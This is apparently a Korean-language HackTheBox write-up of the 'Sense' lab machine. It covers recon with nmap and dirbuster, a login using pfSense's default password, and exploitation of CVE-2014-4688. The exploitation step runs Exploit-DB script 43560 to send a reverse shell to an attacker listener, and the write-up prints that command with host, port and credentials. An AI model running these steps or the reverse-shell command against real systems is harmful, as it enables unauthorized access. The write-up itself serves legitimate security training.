# Sense - HackTheBox
## Recon
```bash
sudo nmap -p 80,443 -sC -sV -vv -oA Sense 10.10.10.60
```
<img width="1106" height="425" alt="image" src="https://github.com/user-attachments/assets/98747350-630b-4a15-b9fa-3c03b56e2d73" />

- HTTP(80)
- HTTPS(443)

---
## HTTPS
### banner grabbing
```bash
whatweb https://10.10.10.60
```
<img width="1106" height="113" alt="image" src="https://github.com/user-attachments/assets/312e466e-94b2-4166-9c15-c1dd86550d68" />

<br>
<br>

- 서버 페이지에서 특별한 점을 발견하지는 못했다.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/03543c6f-fd7b-4f5b-a64b-9b61add4b495" />

### dirbuster
- 예전 버전의 서버(2017)에 대해서는 `gobuster`나 `feroxbuster`보다 `dirbuster`가 더 효과적으로 작동.
- `/themes/pfsense_ng` 경로 발견.
```bash
dirbuster &
```
<img width="768" height="547" alt="image" src="https://github.com/user-attachments/assets/0e45950d-1bf7-4612-9069-3995d4b77e4c" />

<br>
<br>

- https://www.pfsense.org/about-pfsense/
- 방화벽 기능을 하는 프로그램.
<img width="926" height="360" alt="image" src="https://github.com/user-attachments/assets/e77335c2-cb61-48fb-ab11-e1ef4648e8fc" />

<br>
<br>

- `/system-users.txt`발견.
<img width="771" height="548" alt="image" src="https://github.com/user-attachments/assets/5b0318ca-37a6-4fc9-b155-800f3132a4df" />

<br>
<br>

- `Rohit`유저 발견.
<img width="474" height="172" alt="image" src="https://github.com/user-attachments/assets/babad11f-9310-498d-85bc-149817cfe651" />

<br>
<br>

- `pfsense`의 기본 비밀번호 `pfsense`를 사용하여 로그인.(rohit:pfsense)
- `pfsense 2.1.3`
<img width="1100" height="678" alt="image" src="https://github.com/user-attachments/assets/eb91dfec-6241-4c33-803a-ea734a46824d" />

### CVE-2014-4688
- https://nvd.nist.gov/vuln/detail/CVE-2014-4688
- `hostname`, `smartmonemail`, `database` 값을 가지고 임의의 명령어 실행이 가능한 취약점.
<img width="1100" height="492" alt="image" src="https://github.com/user-attachments/assets/73fe0d36-79fc-4d62-a15c-a7f423251280" />

<br>
<br>

- https://www.exploit-db.com/exploits/43560
- 파이썬 리버스 셸 코드를 8진수로 변경해서 `/status_rrd_graph_img.php`로 전달하는 코드.
<img width="1105" height="416" alt="image" src="https://github.com/user-attachments/assets/9df9db15-67e2-4f48-bc34-61a90d8dfde7" />

<br>
<br>

- `proxies`를 설정.
<img width="1105" height="45" alt="image" src="https://github.com/user-attachments/assets/4d45b0a9-d073-4c75-978f-b1cdd5a2275e" />
<img width="1105" height="221" alt="image" src="https://github.com/user-attachments/assets/59078a53-19e4-4dca-97e6-793d80ce3ff6" />

<br>
<br>

- 스크립트 실행.
```bash
python3 43560.py --rhost 10.10.10.60 --lhost 10.10.16.4 --lport 80 --username rohit --password pfsense
```
<img width="1105" height="89" alt="image" src="https://github.com/user-attachments/assets/8bc6eda0-4502-4d65-b578-9fe6fc4c5322" />

<br>
<br>

- `burpsuite`로 가로채서 확인.
<img width="1100" height="260" alt="image" src="https://github.com/user-attachments/assets/9b54ea89-3f26-4af0-9c32-3dc8ec1416ca" />

<br>
<br>

- 셸 획득.
<img width="1105" height="142" alt="image" src="https://github.com/user-attachments/assets/97206e6d-d425-4723-96cf-fc61b1bcc476" />

---
## FLAG
- `/home/rohit/user.txt`
<img width="1105" height="117" alt="image" src="https://github.com/user-attachments/assets/c5d479f4-761a-43a0-ad36-4bfca21a94b5" />

<br>
<br>

- `/root/root.txt`
<img width="1105" height="271" alt="image" src="https://github.com/user-attachments/assets/78b15e73-b008-474e-9052-c3abd71881ba" />















